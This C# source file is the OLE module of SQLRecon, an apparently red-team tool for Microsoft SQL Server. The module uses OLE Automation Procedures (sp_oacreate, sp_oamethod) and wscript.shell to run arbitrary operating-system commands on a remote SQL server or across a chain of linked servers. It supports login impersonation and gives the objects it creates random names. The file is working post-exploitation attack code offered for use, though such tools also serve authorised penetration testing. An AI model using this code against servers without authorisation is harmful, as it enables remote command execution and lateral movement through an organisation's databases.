using System.Collections.Generic;
using System.Data.SqlClient;
using SQLRecon.Commands;
using SQLRecon.Utilities;

namespace SQLRecon.Modules
{
    internal abstract class Ole
    {
        /// <summary>
        /// The StandardOrImpersonation method will create a OLE object on a remote SQL
        /// server and use wscript.shell to execute an arbitrary command.
        /// Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="command"></param>
        /// <param name="impersonate"></param>
        internal static void StandardOrImpersonation(SqlConnection con, string command, string impersonate = null)
        {
            // Generate a new random output and program name.
            string output = RandomStr.Generate(8); 
            string program = RandomStr.Generate(8);
            
            // The queries dictionary contains all queries used by this module
            Dictionary<string, string> queries = new Dictionary<string, string>
            {
                { "execute_ole", string.Format(Query.OleExecution, output, program, command) }
            };
            
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            if (!string.IsNullOrEmpty(impersonate))
            {
                queries = Format.ImpersonationDictionary(impersonate, queries);
            }
            
            // If /debug is provided, only print the queries then gracefully exit the program.
            if (Print.DebugQueries(queries))
            {
                // Go no further
                return;
            }
            
            // First check to see if ole automation procedures is enabled. 
            // Impersonation is supported.
            bool status = (string.IsNullOrEmpty(impersonate))
                ? Config.ModuleStatus(con, "Ole Automation Procedures")
                : Config.ModuleStatus(con, "Ole Automation Procedures", impersonate);
            
            if (status == false)
            {
                Print.Error("You need to enable OLE Automation Procedures (enableole).", true);
                // Go no further.
                return;
            }
            
            Print.Status($"Setting sp_oacreate to '{output}'.", true);
            Print.Status($"Setting sp_oamethod to '{program}'.", true);
            
            _printStatus(output, program, Sql.Query(con, queries["execute_ole"]));
        }
        
        /// <summary>
        /// The LinkedOrChain method will create a OLE object on a remote linked SQL
        /// server and use wscript.shell to execute an arbitrary command.
        /// Execution against the last SQL server specified in a chain of linked SQL servers is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="command"></param>
        /// <param name="linkedSqlServer"></param>
        /// <param name="linkedSqlServerChain"></param>
        internal static void LinkedOrChain(SqlConnection con, string command, string linkedSqlServer, string[] linkedSqlServerChain = null)
        {
            // Generate a new random output and program name.
            string output = RandomStr.Generate(8); 
            string program = RandomStr.Generate(8);
            bool status;
            
            // The queries dictionary contains all queries used by this module
            Dictionary<string, string> queries = new Dictionary<string, string>
            {
                { "execute_ole", string.Format(Query.OleLinkedExecution, output, program, command) }
            };

            if (linkedSqlServerChain == null)
            {
                // Format all queries so that they are compatible for execution on a linked SQL server.
                queries = Format.LinkedDictionary(linkedSqlServer, queries);
                
                // First check to see if xp_cmdshell is enabled.
                status = Config.LinkedModuleStatus(con, "Ole Automation Procedures", linkedSqlServer);
            }
            else
            {
                // Format all queries so that they are compatible for execution on the last SQL server specified in a linked chain.
                queries = Format.LinkedChainDictionary(linkedSqlServerChain, queries);
                
                // First check to see if xp_cmdshell is enabled.
                status = Config.LinkedModuleStatus(con, "Ole Automation Procedures", null, linkedSqlServerChain);
            }
            
            if (status == false)
            {
                Print.Error("You need to enable OLE Automation Procedures (enableole).", true);
                // Go no further.
                return;
            }

            // If /debug is provided, only print the queries then gracefully exit the program.
            if (Print.DebugQueries(queries))
            {
                // Go no further
                return;
            }  
            
            Print.Status($"Setting sp_oacreate to '{output}'.", true);
            Print.Status($"Setting sp_oamethod to '{program}'.", true);
            
            _printStatus(output, program, Sql.CustomQuery(con, queries["execute_ole"]));
        }

        /// <summary>
        /// The _printStatus method will display the status of the 
        /// OLE command execution.
        /// </summary>
        /// <param name="output"></param>
        /// <param name="program"></param>
        /// <param name="sqlOutput"></param>
        private static void _printStatus (string output, string program, string sqlOutput)
        {
            if (sqlOutput.Contains("0"))
            {
                Print.Success($"Executed command. Destroyed '{output}' and '{program}'.", true);
            }
            else if (sqlOutput.Contains("permission"))
            {
                Print.Error("The current user does not have permissions to enable OLE Automation Procedures.", true);
            }
            else if (sqlOutput.Contains("blocked"))
            {
                Print.Error("You need to enable OLE Automation Procedures.", true);
            }
            else
            {
                Print.Error($"{sqlOutput}.", true);
            }
        }
    }
}